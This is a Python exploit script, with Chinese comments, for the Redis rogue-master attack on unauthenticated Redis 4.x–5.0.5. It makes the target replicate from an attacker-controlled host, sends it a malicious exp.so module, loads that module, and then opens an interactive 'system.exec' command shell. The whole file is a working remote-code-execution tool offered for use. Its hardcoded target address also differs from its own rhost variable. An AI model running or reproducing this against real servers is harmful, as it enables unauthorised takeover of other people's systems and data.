# coding:utf-8

import socket
import time

CRLF = "\r\n"

# Redis未授权访问在4.x/5.0.5以前版本下，我们可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。

# 也可以进入redis使用system.exec 来调用命令

def redis_format(command):
    cmd = []
    if isinstance(command,list):
        cmd = command
    else:
        cmd.append(command)

    result = []
    for x in range(len(cmd)):
        rn_list = cmd[x].split(' ')              # 进行空格切分
        rn_zong_len = len(rn_list)              # *? 表示总长度的获取
        for y in range(len(rn_list)):
            rn_list[y] = '$'+str(len(rn_list[y]))+CRLF+rn_list[y].replace("^",' ')
        

        result.append('*'+str(rn_zong_len)+CRLF+CRLF.join(rn_list)+CRLF)
    return ''.join(result).encode('utf-8')
        # 如果不需要的话，可以删除encode()函数


def interactive_recv(content):
    print('<--\n',content)

def interactive_send(content):
    print('-->\n',content)


def redis_master(lhost,lport):
    s_master = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s_master.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s_master.bind((lhost,lport))
    s_master.listen(7)
    ss,addr = s_master.accept()
    print("开始捕捉到连接")
    while True:
        r_content = ss.recv(30*1024).decode('utf-8')
        if r_content:
            interactive_recv(r_content)
        if 'PING' in r_content :
            ss.send('+PONG\r\n'.encode('utf-8'))
            interactive_send('+PONG')
        elif 'REPLCONF' in r_content or 'capa' in r_content:
            ss.send('+OK\r\n'.encode('utf-8'))
            interactive_send('+OK')
        elif 'PSYNC' in r_content or 'SYNC' in r_content :
            result = '+FULLRESYNC'+'c'*40+'1'+CRLF
            result += '$'+str(len(payload))+CRLF
            result = result.encode('utf-8')
            result += payload
            result += CRLF.encode('utf-8')
            ss.send(result)
            interactive_send("已经发送.so恶意文件")
            return 





def send(ss:socket,request):
    ss.send(redis_format(request))
    print(ss.recv(30*1024).decode('utf-8'))



def interact_shell(sock):
	try:
		while True:
			shell=input("shell >> ")
			shell=shell.replace(" ","${IFS}")
			if shell=="exit" or shell=="quit":
				exit()
			else:
				send(sock,"system.exec {}".format(shell))
	except KeyboardInterrupt:
		return




if __name__ == "__main__":
    payload = open('./exp.so','rb').read()
    exp_name = 'exp.so'
    lhost = '192.168.2.18'
    lport = 9998
    rhost = '192.168.3.138'
    rport = 6379


    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.connect(('192.168.2.138',6379))

    send(ss,'slaveof 192.168.2.18 9998')
    send(ss,'config set dbfilename {}'.format(exp_name))
    time.sleep(2)
    redis_master(lhost,lport)
    send(ss,'MODULE LOAD ./{}'.format(exp_name))

    interact_shell(ss)